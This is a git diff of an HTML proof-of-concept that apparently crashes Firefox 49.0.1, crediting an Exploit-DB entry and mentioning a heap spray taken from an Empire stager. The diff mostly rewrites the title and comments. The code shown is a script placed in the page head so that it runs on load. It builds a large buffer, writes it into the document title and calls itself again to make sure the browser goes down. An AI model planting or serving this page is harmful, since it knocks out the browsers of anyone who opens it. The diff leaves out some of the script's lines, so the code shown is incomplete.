@@ -1,9 +1,18 @@
 <html><head>
-<title>Freezing...Firefox 49.0.1 Vulnerability</title>
-<!-- Original POC from [ sultan albalawi ] -->
-<!-- https://www.exploit-db.com/exploits/40536/ -->
+<title>Firefox 49.0.1 - Browser Remote Crash Exploit (HeapSpray)</title>
 
-<!-- for javascript auto-execution, we need to place it inside <head> </head> tags -->
+<!--
+---------------------------------------------
+Firefox 49.0.1 - Browser Remote Crash Exploit
+---------------------------------------------
+Credits  : sultan albalawi [vuln discover]
+POC      : https://www.exploit-db.com/exploits/40536/
+
+HeapSpray: Taken from Empire stager by: Chaitanya Haritash
+For javascript auto-execution, we need to place it inside <head> </head> tags
+-->
+
+
 <script type="text/javascript">
 var ref = (function ex() {
       var buffer = "";
@@ -19,5 +28,4 @@ document.title = buffer2;
 ref(); // call funtion again :D just to be sure that it fuck things up.
 
 </script></head><body></body>
-<!-- <body>'helo firefox'<a href="javascript:ex();">CLICK</a></body> -->
 </html>
